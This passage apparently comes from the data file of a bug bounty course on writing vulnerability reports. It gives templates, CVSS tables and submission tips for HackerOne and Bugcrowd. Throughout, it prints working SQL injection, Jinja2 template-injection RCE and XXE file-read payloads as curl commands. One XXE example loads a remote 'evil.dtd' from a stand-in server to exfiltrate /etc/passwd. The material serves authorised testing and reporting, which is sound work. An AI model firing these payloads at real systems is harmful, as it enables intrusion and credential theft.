          "Mention the SSRF's scope: can it access only HTTP services, or also gopher/dict? Different protocols mean different impact",
          "For blind SSRF (no response visible), focus on the collaborator callback as the primary evidence",
        ],
      },
      {
        title: "SQL Injection Report Template",
        text: "SQLi reports need to demonstrate database interaction beyond boolean responses. Time-based SQLi requires showing a significant delay (5+ seconds) that only occurs with a sleep payload. Error-based SQLi requires the actual database error message. UNION-based SQLi needs extracted data in the response. Always include the exact payload that works.",
        commands: [
          {
            cmd: '## SQL Injection — Report Template\n\n**Title:** SQL Injection in [PARAMETER] — [DATABASE_TYPE] database fingerprinting and data extraction\n\n**Severity:** Critical (CVSS: 9.8 — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)\n\n**URL:** https://target.com/[ENDPOINT]?[PARAMETER]=[VULNERABLE_VALUE]\n\n**Description:**\nThe `[PARAMETER]` parameter is vulnerable to SQL injection. User input is concatenated directly into SQL queries without parameterization, allowing an attacker to manipulate database queries, extract data, and potentially execute commands on the database server.\n\n**Impact:**\n- Complete database compromise: read, modify, and delete all data\n- Authentication bypass (if login query is injectable)\n- [If applicable: RCE via xp_cmdshell or similar database features]\n- Potential data breach of all user records, credentials, and sensitive data\n\n**Steps to Reproduce:**\n1. Confirm injection with a time-based payload:\n   `curl -s \'https://target.com/[ENDPOINT]?[PARAMETER]=[VALUE]\' AND SLEEP(5)-- -`\n   Observe ~5 second response delay vs ~0.2s normal response\n2. Extract database version:\n   `curl -s \'https://target.com/[ENDPOINT]?[PARAMETER]=[VALUE]\' UNION SELECT @@version,2,3-- -`\n3. Extract table names:\n   `curl -s \'https://target.com/[ENDPOINT]?[PARAMETER]=[VALUE]\' UNION SELECT table_name,2,3 FROM information_schema.tables-- -`\n\n**Proof of Concept:**\n[Attach the time-delay comparison: normal vs sleep response]\n[Attach extracted data: database version, user, table names]\n\n**Remediation:**\n- Use parameterized queries (prepared statements) for ALL database operations\n- Apply strict input validation — reject unexpected characters rather than escaping them\n- Use a WAF as defense-in-depth (not a replacement for parameterized queries)\n- Run database with least-privilege principle — separate read/write accounts',
            desc: "SQLi report template — time-based confirmation, UNION extraction, and database fingerprinting chain",
          },
          {
            cmd: "time curl -s 'https://target.com/api/users?id=1' -o /dev/null -w 'Normal: %{time_total}s\\n' && time curl -s 'https://target.com/api/users?id=1%20AND%20SLEEP(5)--%20-' -o /dev/null -w 'SLEEP(5): %{time_total}s\\n'",
            desc: "Time-based SQLi PoC: run the normal request and the SLEEP(5) request back-to-back — the delay proves injection",
          },
          {
            cmd: "curl -s 'https://target.com/api/users?id=1%20UNION%20SELECT%20@@version,2,3--%20-' | head -5",
            desc: "UNION-based extraction: replace @@version with database(), user(), or table_name FROM information_schema.tables",
          },
          {
            cmd: "curl -s 'https://target.com/api/users?id=1%27%22%60' | grep -i 'sql\\|error\\|warning\\|mysql\\|ora' | head -5",
            desc: "Error-based detection: send a quote/backtick to trigger a database error message in the response",
          },
          {
            cmd: "cat << 'EOF' > sqli-evidence.txt\nSQL Injection Confirmation\n==========================\nVulnerable Endpoint: /api/users\nVulnerable Parameter: id\nDatabase Type: [MySQL / PostgreSQL / MSSQL / Oracle]\n\nEvidence:\n[x] Time-based: SLEEP(5) caused [X] second delay (normal: [Y] seconds)\n[x] Error-based: Database error message returned with special characters\n[x] UNION-based: [N] columns detected, version extracted: [DB_VERSION]\n\nExtracted Data:\n- Database version: [VERSION]\n- Current user: [DB_USER]\n- Database name: [DB_NAME]\nEOF",
            desc: "SQLi evidence template — document each confirmation method and extracted data points",
          },
        ],
        tips: [
          "Always include both the normal response time AND the sleep response time — the comparison is the evidence",
          "Error-based SQLi is the easiest to prove — grep for 'mysql_fetch', 'ORA-', or 'SQLSTATE' in responses",
          "Use sqlmap with --batch --level=2 for automated extraction, but manually verify the payloads for the report",
          "Blind SQLi (no error, no UNION, no time) requires conditional responses — document TRUE vs FALSE payload differences",
        ],
      },
      {
        title: "RCE & File Upload Report Template",
        text: "RCE reports are the ultimate finding. The report must prove code execution with a benign command (id, hostname, whoami) and show the server's response. The PoC should use a non-destructive command — never delete files, modify data, or install backdoors. File upload RCE reports need to show both the upload and the file execution.",
        commands: [
          {
            cmd: '## Remote Code Execution — Report Template\n\n**Title:** Remote Code Execution (RCE) via [VECTOR] — full server compromise\n\n**Severity:** Critical (CVSS: 10.0 — AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)\n\n**Description:**\n[VECTOR] allows an unauthenticated attacker to execute arbitrary system commands on the server. This provides complete control over the application, its data, and potentially the underlying infrastructure.\n\n**Impact:**\n- Full server compromise: execute any system command\n- Read, modify, or delete all application data and source code\n- Pivot to internal network services and databases\n- [If applicable: access to cloud metadata and cloud resource manipulation]\n\n**Steps to Reproduce:**\n1. Execute a non-destructive command to confirm RCE:\n   `curl -s \'https://target.com/[ENDPOINT]\' -d \'[PARAMETER]=;id\'`\n2. The server response includes the output of `id`:\n   `uid=33(www-data) gid=33(www-data) groups=33(www-data)`\n3. Confirm the hostname for additional context:\n   `curl -s \'https://target.com/[ENDPOINT]\' -d \'[PARAMETER]=;hostname\'`\n\n**Proof of Concept:**\n[Attach screenshot of the id command response in the HTTP response body]\n[Attach screenshot of the hostname command response]\n\n**Remediation:**\n- Never pass user input directly to system(), exec(), shell_exec(), or eval()\n- Use safe APIs and parameterized system calls\n- Apply strict allowlist-based input validation\n- Run the application in a sandboxed or containerized environment with minimal OS access\n- Implement a Web Application Firewall (WAF) as defense-in-depth',
            desc: "RCE report template — uses non-destructive id/hostname commands to prove full server control",
          },
          {
            cmd: "curl -s -X POST 'https://target.com/debug' -d 'cmd=id' | grep -oE 'uid=[0-9]+[^<]+'",
            desc: "RCE PoC: send the id command and extract the uid/gid response — proves command execution",
          },
          {
            cmd: "curl -s 'https://target.com/cgi-bin/status?command=hostname' | head -5",
            desc: "Alternative RCE test: some systems expose command injection in CGI scripts — test with hostname, whoami, ls",
          },
          {
            cmd: "cat << 'EOF' > rce-evidence.txt\nRCE Confirmation\n=================\nVector: [Parameter injection / File upload / Deserialization]\nEndpoint: [URL]\n\nExecuted Commands:\n[x] id → uid=33(www-data) gid=33(www-data)\n[x] hostname → ip-10-0-1-234.ec2.internal\n[x] pwd → /var/www/html\n[x] ls -la / → [show app directory if sensitive data found]\n\nFiles Accessed:\n- /etc/passwd: [READABLE / NOT]\n- /etc/shadow: [READABLE / NOT]\n- /var/www/html/.env: [Contains DB credentials if available]\nEOF",
            desc: "RCE evidence template — document every command executed and what data was accessible",
          },
        ],
        tips: [
          "NEVER use destructive commands (rm, dd, format, > /dev/null) — stick to id, hostname, pwd, ls, whoami",
          "Read /etc/passwd to prove OS-level access without writing anything — cat is read-only and safe",
          "Document which system user the server runs as (www-data vs root) — root-level RCE is Critical, www-data is High",
          "If you can read /proc/1/environ, include the environment variables — they often contain database passwords and API keys",
        ],
      },
    ],
    tools: [
      {
        name: "sqlmap",
        desc: "Automated SQL injection tool — use for extraction but verify payloads manually for the report",
        install: "git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap && cd sqlmap && python3 sqlmap.py",
        link: "https://sqlmap.org/",
      },
      {
        name: "interactsh",
        desc: "Collaborator for SSRF confirmation — captures outbound HTTP/DNS requests from the target server",
        install: "go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest",
        link: "https://github.com/projectdiscovery/interactsh",
      },
      {
        name: "time",
        desc: "Bash built-in for measuring command duration — essential for time-based SQLi proof",
        link: "https://man7.org/linux/man-pages/man1/time.1.html",
      },
    ],
    summary:
      "You now have complete server-side report templates for SSRF, SQLi, and RCE — the three most technically complex vulnerabilities to document. Each template includes collaborator evidence, time-based comparisons, and non-destructive command execution for bulletproof PoCs that programs can verify.",
  },
  {
    id: "submission-mastery",
    number: 4,
    title: "Submission Mastery — Customization & Platform Guides",
    subtitle: "Tailor each template for HackerOne, Bugcrowd, and private programs",
    color: "oklch(0.7 0.14 65)",
    overview:
      "A good template becomes a great report when you customize it for the platform and program. HackerOne expects clear language and triage-friendly formatting. Bugcrowd requires Mediation-Ready Proof-of-Concept. Private programs have specific scopes and exclusions. This chapter teaches you to adapt templates, use CVSS correctly, and avoid common report rejection reasons.",
    sections: [
      {
        title: "Customizing Templates for Different Programs",
        text: "Every program has different requirements. Some want video PoCs. Others want only curl commands. Some reject reports with screenshots. Read the program's disclosure policy before submitting. The golden rule: make the triage team's job as easy as possible. A report that takes 30 seconds to verify gets accepted faster than one that takes 30 minutes.",
        commands: [
          {
            cmd: "cat << 'EOF' > customize-report.sh\n#!/bin/bash\n# Customize this template before submitting\n# 1. Replace placeholders\necho 'Checking for [PLACEHOLDER] values...'\ngrep -n '\\[.*\\]' report-template.md && echo 'UNCOMMITTED PLACEHOLDERS FOUND!' || echo 'All placeholders filled'\n# 2. Check for 200+ character lines (URLs might wrap in plaintext)\nawk 'length>200{print NR\": \"length\" chars\"}' report-template.md\n# 3. Count reproduction steps (should be 3-6)\ngrep -c '^[0-9]\\+\\.' report-template.md\necho 'reproduction steps found'\nEOF",
            desc: "Pre-submission checklist script: verify placeholders are filled, no long lines, and correct step count",
          },
          {
            cmd: "cat << 'EOF' > platform-differences.txt\nPlatform-Specific Report Rules\n===============================\n\nHACKERONE:\n- Preferred format: Markdown\n- Attachments: Max 25MB per file, 100MB total\n- CC: Must NOT include other vendors/services\n- Severity: Use HackerOne's internal severity (not CVSS directly)\n- Triage: Usually 1-5 business days\n- Bounty: Determined after triage, can be negotiated\n\nBUGCROWD:\n- Preferred format: Rich text or plain text\n- Attachments: Max 10MB per file\n- Credentials: Must create test accounts if needed for reproduction\n- Mediation: Bugcrowd mediates disputes (save all evidence)\n- Triage: Usually 24-72 hours\n- Bounty: Set per vulnerability category in program brief\n\nINTIGRITI:\n- Preferred format: Markdown with inline images\n- Attachments: Max 5MB per file\n- Language: English preferred, French/Italian sometimes accepted\n- Triage: Usually 1-3 business days\n- Bounty: Listed per vulnerability type\n\nPRIVATE PROGRAMS:\n- Read the policy carefully — scope may differ from public description\n- Some require specific subject format: \"[PROGRAM] - [TYPE] - [ENDPOINT]\"\n- Response time varies widely (1 day to 2 weeks)\n- Always ask before testing certain vulnerability classes\nEOF",
            desc: "Platform comparison guide — differences in formatting, attachments, triage time, and payout structure",
          },
          {
            cmd: "cat << 'EOF' > report-quality-checklist.txt\nPre-Submission Checklist\n=========================\n\n□ All [PLACEHOLDER] values replaced\n□ Reproduction steps are numbered and unambiguous\n□ Each step can be followed by someone without your specific setup\n□ PoC commands tested on a CLEAN machine (not still using your session)\n□ Screenshots include the URL bar (proves it's the target domain)\n□ Collaborator/Interactsh URLs are replaced with the actual callback\n□ No destructive commands in the PoC (rm, dd, delete, format)\n□ Severity matches the program's VRT (Vulnerability Rating Taxonomy)\n□ Report does not include personal information (IPs can be redacted)\n□ Duplicate check: searched for this issue in public reports\n□ Program scope: confirmed the asset is in scope\n□ Program rules: confirmed the test method is allowed\nEOF",
            desc: "Quality checklist — run through this before every submission to avoid basic rejection reasons",
          },
        ],
        tips: [
          "HackerOne allows you to edit the report after submission — use this to add missing evidence within 24 hours",
          "Bugcrowd's mediation phase means you can't edit — make sure the initial submission is complete and correct",
          "Some programs auto-close reports that don't use their required subject format — read the policy first",
          "If English isn't the triager's first language, use short sentences and avoid idioms",
        ],
      },
      {
        title: "CVSS Scoring & Severity Calculation",
        text: "Wrong severity is the #1 reason reports get disputed. A Medium reported as Critical wastes everyone's time. A Critical reported as Low gets you less money. Use the CVSS 3.1 calculator to get the score right before submitting. These reference values cover the most common bug bounty findings — bookmark them for quick reference.",
        commands: [
          {
            cmd: "cat << 'EOF' > severity-reference.txt\nStandard Severity Values (CVSS 3.1)\n====================================\n\nREFLECTED XSS (no auth needed, user interaction):\n  CVSS: 6.1 (Medium) — AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N\n  Note: If on admin page, add PR:H → still Medium\n\nSTORED XSS (affects all users):\n  CVSS: 8.7 (High) — AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N\n  Note: If stored in admin-only panel, drop to Medium\n\nBLIND XSS (triggers in admin panel):\n  CVSS: 8.2 (High) — AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:H/A:N\n  Note: Higher because it reaches internal users\n\nIDOR (read another user's data):\n  CVSS: 7.5 (High) — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N\n  Note: If write access too → 8.8 (High)\n\nIDOR MASS (100+ records accessible):\n  CVSS: 9.1 (Critical) — AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N\n  Note: Changed scope to Changed (S:C) due to data breach potential\n\nPRIVILEGE ESCALATION (user → admin):\n  CVSS: 8.8 (High) — AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H\n  Note: If from unauthenticated → 9.8 (Critical)\n\nAUTH BYPASS (no session needed):\n  CVSS: 9.8 (Critical) — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\n  Note: Full impact — read, write, execute\n\nSSRF (outbound requests):\n  CVSS: 8.6 (High) — AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N\n  Note: If metadata + credentials accessible → 9.1 (Critical)\n\nSQL INJECTION (data extraction):\n  CVSS: 9.8 (Critical) — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\n  Note: If only error-based (no extraction) → 6.5 (Medium)\n\nRCE (command execution):\n  CVSS: 10.0 (Critical) — AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H\n  Note: If requires auth → PR:L → 9.9 (Critical)\n\nFILE UPLOAD (arbitrary file):\n  CVSS: 8.8 (High) — AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H\n  Note: If unauthenticated upload → 9.8 (Critical)\nEOF",
            desc: "CVSS 3.1 reference table — the correct base score and vector for every common vulnerability type",
          },
          {
            cmd: "cat << 'EOF' > cvss-tips.txt\nCVSS Scoring Tips\n==================\n\n1. Scope (S:U vs S:C) matters most for severity:\n   - S:U (Unchanged) = vulnerability affects only the component\n   - S:C (Changed) = vulnerability affects resources beyond the component\n   Example: XSS on a profile page is S:C (affects other users)\n\n2. Privileges Required (PR) depends on WHO triggers it:\n   - PR:N = anyone can trigger (reflected XSS via link)\n   - PR:L = requires login (stored XSS on profile)\n   - PR:H = admin only (stored XSS in admin panel)\n\n3. User Interaction (UI) is about the VICTIM:\n   - UI:N = no click needed (stored XSS executes on page load)\n   - UI:R = requires click (reflected XSS via crafted link)\n\n4. Never change the environmental or temporal modifiers:\n   - They're specific to each organization's environment\n   - Submit the base score only — let the program adjust\nEOF",
            desc: "CVSS scoring tips — understand Scope, Privileges, and User Interaction to choose the right base score",
          },
          {
            cmd: "python3 -c \"\n# Quick CVSS 3.1 Rounding Helper\nimport math\nbase_score = float(input('Enter base score (0-10): '))\nprint(f'Rounded: {round(base_score * 10) / 10}')\nprint(f'Severity: ', end='')\nif base_score >= 9.0: print('Critical')\nelif base_score >= 7.0: print('High')\nelif base_score >= 4.0: print('Medium')\nelif base_score > 0: print('Low')\nelse: print('None')\n\"",
            desc: "CVSS rounding helper — calculates the correct rounded score and severity rating",
          },
        ],
        tips: [
          "Over-severity (reporting Medium as Critical) annoys triagers — they may start ignoring your reports",
          "Under-severity (reporting Critical as Low) costs you money — use the reference table above as a baseline",
          "Some programs have their own VRT (Vulnerability Rating Taxonomy) that overrides CVSS — check the program brief",
          "CVSS is a BASE score — it doesn't include environmental factors. Programs may adjust up or down based on their setup",
        ],
      },
      {
        title: "Common Rejection Reasons & How to Avoid Them",
        text: "Reports get rejected for predictable reasons. Missing reproduction steps, unclear impact, duplicate submissions, and out-of-scope testing are the top four. This section covers exactly what programs look for and how to avoid the most common rejection patterns. Learn from others' mistakes instead of making your own.",
        commands: [
          {
            cmd: "cat << 'EOF' > rejection-reasons.txt\nTop 10 Report Rejection Reasons\n=================================\n\n1. MISSING REPRODUCTION STEPS (30%)\n   - Fix: Number each step. Make it so specific a bot could follow it.\n\n2. UNCLEAR IMPACT (20%)\n   - Fix: 'Attacker can read other users' data' → 'Attacker can read ALL users'\n     medical records, SSNs, and payment info — 50,000 records exposed'\n\n3. DUPLICATE (15%)\n   - Fix: Search the program's disclosed reports before submitting\n   - If similar but different endpoint, explain why it's distinct\n\n4. OUT OF SCOPE (12%)\n   - Fix: Triple-check the program scope before testing\n   - Document that the affected endpoint IS in scope\n\n5. NOT REPRODUCIBLE (8%)\n   - Fix: Test your PoC on a clean machine (no Burp, no extensions)\n   - Include the EXACT curl command with your session replaced\n\n6. MISSING EVIDENCE (7%)\n   - Fix: Attach screenshots, collaborator logs, and raw responses\n   - For blind vulns: the collaborator callback IS the evidence\n\n7. LOW QUALITY / AUTO-GENERATED (4%)\n   - Fix: Remove scanner output noise — only include relevant findings\n   - Customize each report manually, don't paste scanner HTML\n\n8. WONT FIX / INFORMATIVE (2%)\n   - Fix: Choose programs that care about the finding type\n   - Some programs accept only RCE/SSRF, not self-XSS or CSP missing\n\n9. WRONG SEVERITY (1.5%)\n   - Fix: Use the CVSS reference table above\n\n10. POLICY VIOLATION (0.5%)\n    - Fix: Read the program rules. Don't test what's explicitly forbidden\nEOF",
            desc: "Top 10 rejection reasons with fix actions — the most common reasons reports get rejected on HackerOne/Bugcrowd",
          },
          {
            cmd: "cat << 'EOF' > first-report-tips.txt\nTips for Your First Report\n===========================\n\n1. Start with a LOW/Medium severity finding, not Critical:\n   - Programs take first-time reporters more seriously when they're accurate\n   - A well-documented Medium is better than a poorly-documented Critical\n\n2. Include a SUMMARY block at the very top:\n   - Triage teams scan 50+ reports per day\n   - Make your report scannable: Vuln Type → Endpoint → Impact → Severity\n\n3. Never include personal anger or frustration:\n   - 'This is a severe security flaw' NOT 'Your developers are incompetent'\n   - Professional tone gets better response and higher bounties\n\n4. Respond to triage questions within 24 hours:\n   - Delayed responses get the report closed as 'Insufficient Evidence'\n   - Set up email notifications for platform messages\n\n5. If rejected, don't argue immediately:\n   - Wait 24 hours, re-read your report objectively\n   - If you genuinely disagree, politely explain with ADDITIONAL evidence\n   - Some programs have an appeal process — use it, don't abuse it\nEOF",
            desc: "Tips for first-time submitters — building credibility with triage teams from your very first report",
          },
          {
            cmd: "cat << 'EOF' > report-response-timeline.txt\nWhat Happens After You Submit\n==============================\n\nHOUR 0-24: Initial Review\n- Automated checks: spam filter, duplicate check, scope validation\n- If you get a 'Triage' status, a human is reviewing\n\nDAY 1-5: Triage Evaluation\n- Triage team verifies reproduction steps\n- They may ask clarifying questions\n- They assign severity (may differ from your CVSS)\n\nDAY 3-14: Program Review\n- Program security team reviews the triage evaluation\n- Some programs pay immediately after triage\n- Others wait until they implement a fix\n\nDAY 14-90: Bounty & Disclosure\n- Bounty is awarded (or negotiated)\n- Report may be disclosed if the program participates in disclosure\n- You may be asked to retest after the fix\n\nTIPS:\n- Don't email the program directly — use the platform's message system\n- If no response after 2 weeks, add a comment on the report\n- Average time to bounty: HackerOne ~14 days, Bugcrowd ~30 days\nEOF",
            desc: "Submission timeline — what to expect after hitting submit, from triage through bounty payout",
          },
        ],
        tips: [
          "Your first 5 reports establish your reputation — make them count with thorough documentation",
          "Never submit the same report to multiple programs — it violates every platform's terms",
          "If a report is rejected as duplicate, ask if they can confirm the finding privately (for your resume)",
          "Building a relationship with a program's triage team leads to faster payouts and higher bounties over time",
        ],
      },
    ],
    tools: [
      {
        name: "NIST CVSS Calculator",
        desc: "Official CVSS 3.1 calculator — enter your vector string and get the accurate base score",
        link: "https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator",
      },
      {
        name: "HackerOne Hacktivity",
        desc: "Browse disclosed reports to learn the formats and severity levels that get accepted",
        link: "https://hackerone.com/hacktivity",
      },
      {
        name: "CVSS 3.1 Specification",
        desc: "Complete CVSS 3.1 documentation — understand every metric before scoring your findings",
        link: "https://www.first.org/cvss/v3-1/specification-document",
      },
    ],
    summary:
      "You now know how to customize templates for every platform, calculate CVSS scores accurately, and avoid the top 10 rejection reasons. The difference between a $100 bounty and a $10,000 bounty is often just how well the report is written. Master submission, and your findings speak for themselves.",
  },
  {
    id: "modern-vulns",
    number: 5,
    title: "Modern Web — Report Templates",
    subtitle: "SSTI, XXE, Race Conditions, and WebSocket vulnerabilities — four advanced templates",
    color: "oklch(0.55 0.22 25)",
    overview:
      "Modern web applications introduce new vulnerability classes that traditional scanners miss. Server-Side Template Injection (SSTI) exploits framework rendering engines. XML External Entities (XXE) leverage legacy XML parsers. Race conditions abuse async operations. WebSocket vulnerabilities bypass HTTP-only protections. These templates cover the advanced findings that separate top hunters from the rest.",
    sections: [
      {
        title: "SSTI — Server-Side Template Injection Report",
        text: "SSTI occurs when user input is passed directly into a template engine (Jinja2, Twig, Handlebars, Freemarker) without sanitization. The result is server-side code execution. The report must show both the injection point (the template syntax appears in the response) and actual command execution (a read-file or command-execution payload). Start with a simple math expression to confirm the template engine, then escalate to RCE.",
        commands: [
          {
            cmd: '## SSTI — Report Template\n\n**Title:** Server-Side Template Injection (SSTI) in [PARAMETER] — [TEMPLATE_ENGINE] RCE\n\n**Severity:** Critical (CVSS: 9.8 — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)\n\n**URL:** https://target.com/[ENDPOINT]?[PARAMETER]=[VALUE]\n\n**Description:**\nThe `[PARAMETER]` parameter is rendered by a server-side template engine without sanitization. An attacker can inject template directives that execute arbitrary code on the server. Identified template engine: [Jinja2 / Twig / Freemarker / Handlebars].\n\n**Impact:**\n- Full server-side code execution\n- Read sensitive files (/etc/passwd, application source code, environment variables)\n- [If applicable: RCE via template engine\'s built-in function calls]\n- Access to internal network resources and databases\n\n**Steps to Reproduce:**\n1. Confirm template injection with a math expression:\n   `{{7*7}}` or `${7*7}` or `#{7*7}` — depends on template engine\n2. If the response shows `49` or similar result, SSTI is confirmed\n3. Escalate to command execution:\n   `{{config.__class__.__init__.__globals__[\'os\'].popen(\'id\').read()}}` (Jinja2)\n   or `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}` (Twig)\n4. Extract a safe, non-destructive proof:\n   `curl -s \'[URL]\' -d \'[PARAMETER]={{config}}\' | grep -o \'SECRET_KEY=[A-Za-z0-9]*\'`\n\n**Proof of Concept:**\n[Mathematical expression result confirming template execution]\n[Command output from RCE payload — id, hostname, or file read]\n\n**Remediation:**\n- Never pass user input directly to template rendering functions\n- Use Sandboxed template environments that restrict access to dangerous functions\n- Apply context-aware output encoding BEFORE template rendering\n- Use static template files instead of dynamic template strings',
            desc: "SSTI report template — covers confirmation (math expression) through RCE with Jinja2/Twig/Freemarker payloads",
          },
          {
            cmd: "curl -s 'https://target.com/profile?name={{7*7}}' | grep -o '49\\|{{7\\*7}}'",
            desc: "SSTI detection: inject {{7*7}} — if the response contains '49' instead of the literal payload, SSTI is confirmed",
          },
          {
            cmd: "curl -s 'https://target.com/profile?name={{config.__class__.__init__.__globals__[%27os%27].popen(%27id%27).read()}}' | head -10",
            desc: "Jinja2 RCE payload: reads the output of the 'id' command via Python's os.popen — replace 'id' with any command",
          },
          {
            cmd: "curl -s 'https://target.com/hello?name=${7*7}' | grep -o '49\\|${7\\*7}'",
            desc: "Freemarker SSTI detection: ${7*7} syntax — Freemarker uses ${} for expressions",
          },
          {
            cmd: "curl -s 'https://target.com/greet?username={{cycler.__init__.__globals__.os.popen(%27hostname%27).read()}}' | head -5",
            desc: "Jinja2 RCE via cycler object — an alternative to config.__class__ when globals chain is restricted",
          },
          {
            cmd: "cat << 'EOF' > ssti-evidence.txt\nSSTI Confirmation\n===================\nVulnerable Parameter: name\nTemplate Engine: Jinja2 (Python)\n\nConfirmation Tests:\n[x] {{7*7}} → response contains \"49\"\n[x] ${7*7} → no result (not Freemarker)\n[x] #{7*7} → no result (not Ruby/ERB)\n\nRCE Payload: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}\nOutput: uid=33(www-data) gid=33(www-data)\n\nRCE Payload 2: {{config.__class__.__init__.__globals__['os'].popen('hostname').read()}}\nOutput: web-01-us-east-1\n\nAccessible Files:\n- /etc/passwd: readable\n- /proc/1/environ: readable\n- app/config.py: readable (contains DB creds)\nEOF",
            desc: "SSTI evidence template — document which tests were performed and which template engine was identified",
          },
        ],
        tips: [
          "Start with a math expression ({{7*7}}, ${7*7}, #{7*7}) to identify the template engine before escalating to RCE",
          "Jinja2/Flask is the most common SSTI target — the config.__class__.__init__.__globals__ chain works on most versions",
          "If the RCE payload is blocked, try reading environment variables first: {{config}} dumps all Flask config with SECRET_KEY",
          "SSTI in email templates is common — the developer receives user input and renders it in an HTML email template",
        ],
      },
      {
        title: "XXE — XML External Entity Report Template",
        text: "XXE exploits XML parsers that process external entities. When an application accepts XML input (SOAP APIs, file uploads, DOCX parsing), you can inject an external entity that reads local files, performs SSRF, or causes denial of service. The classic PoC reads /etc/passwd via an entity that references the file. Modern XXE requires bypassing disabled external entities through DTD inclusions or error-based techniques.",
        commands: [
          {
            cmd: '## XXE — Report Template\n\n**Title:** XML External Entity (XXE) Injection in [ENDPOINT] — file read and SSRF\n\n**Severity:** High (CVSS: 7.5 — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)\n\n**Description:**\nThe `[ENDPOINT]` endpoint accepts XML input and processes it with an insecure XML parser. An attacker can define external entities that read local files, interact with internal services, or cause denial of service.\n\n**Impact:**\n- Read arbitrary server files (configuration files, source code, credentials)\n- SSRF to internal network services and cloud metadata endpoints\n- [If applicable: denial of service via Billion Laughs attack]\n\n**Steps to Reproduce:**\n1. Send a simple XXE payload to confirm entity parsing:\n\n```xml\n<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<root>&xxe;</root>\n```\n\n2. If the response contains /etc/passwd contents, XXE is confirmed\n3. Test blind XXE via out-of-band:\n\n```xml\n<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "http://[COLLABORATOR_URL]/oob">\n]>\n<root>&xxe;</root>\n```\n\n4. Check collaborator logs for incoming HTTP/DNS request\n\n**Proof of Concept:**\n[Response containing /etc/passwd or similar system file]\n[Collaborator callback log for blind XXE]\n\n**Remediation:**\n- Disable DTD processing entirely in the XML parser configuration\n- If DTD is required, disable ENTITY expansion and external entity resolution\n- Use JSON or similar non-XML data formats where possible\n- Apply input validation to reject XML with DOCTYPE declarations',
            desc: "XXE report template — covers classic file read, SSRF, and blind OOB exfiltration techniques",
          },
          {
            cmd: "curl -s -X POST 'https://target.com/api/upload' -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"file:///etc/passwd\">]><root>&test;</root>' | head -10",
            desc: "Classic XXE PoC: inject an external entity that reads /etc/passwd and include it in the XML body",
          },
          {
            cmd: "curl -s -X POST 'https://target.com/api/soap' -H 'Content-Type: text/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY oob SYSTEM \"http://YOUR-COLLABORATOR.oastify.com/xxe\">]><soap:Envelope><soap:Body>&oob;</soap:Body></soap:Envelope>'",
            desc: "Blind XXE via SOAP API: the external entity makes an HTTP request to your collaborator — no file content in response",
          },
          {
            cmd: "cat << 'EOF' > xxe-payload.xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY % file SYSTEM \"file:///etc/passwd\">\n  <!ENTITY % dtd SYSTEM \"http://YOUR-SERVER/evil.dtd\">\n  %dtd;\n]>\n<root>&send;</root>\nEOF",
            desc: "XXE with remote DTD — bypasses disabled local entities by loading a DTD from your server that exfiltrates files",
          },
          {
            cmd: "cat << 'EOF' > xxe-evidence.txt\nXXE Confirmation\n=================\nVulnerable Endpoint: /api/upload\nContent-Type: application/xml\n\nFile Read Confirmation:\n[x] /etc/passwd — SUCCESS (response contains user accounts)\n[x] /etc/hostname — SUCCESS\n[x] /proc/1/environ — SUCCESS (contains environment variables)\n\nBlind XXE (OOB):\n[x] Collaborator callback received from target IP\n\nSSRF via XXE:\n[x] Internal URL accessible: http://127.0.0.1:8080/admin\n[x] Cloud metadata: NOT accessible (target uses on-prem)\n\nParser Info:\n- libxml version: [VERSION from error message]\n- External entities: ENABLED\nEOF",
            desc: "XXE evidence template — document file reads, OOB callbacks, and SSRF capabilities",
          },
        ],
        tips: [
          "If file:// entities are blocked, use php://filter for PHP apps or jar:// for Java apps to read files via wrappers",
          "Blind XXE is just as dangerous as reflected XXE — the data still reaches your server via the OOB channel",
          "Error-based XXE: if the parser returns errors, use <!ENTITY xxe SYSTEM 'file:///nonexistent'> to trigger an error message containing file contents",
          "Some WAFs block DOCTYPE — try parameter entities <!ENTITY % test SYSTEM 'file:///etc/passwd'> %test; instead",
        ],
      },
      {
        title: "Race Condition — TOCTOU Report Template",
        text: "Race conditions (Time-of-Check Time-of-Use / TOCTOU) occur when a resource's state changes between verification and usage. Common in coupon codes, gift card redemption, withdrawal limits, and concurrent API requests. The report must prove multiple requests modified the same resource simultaneously, bypassing the intended single-use constraint. Use Burp Intruder or a parallel curl script to demonstrate.",
        commands: [
          {
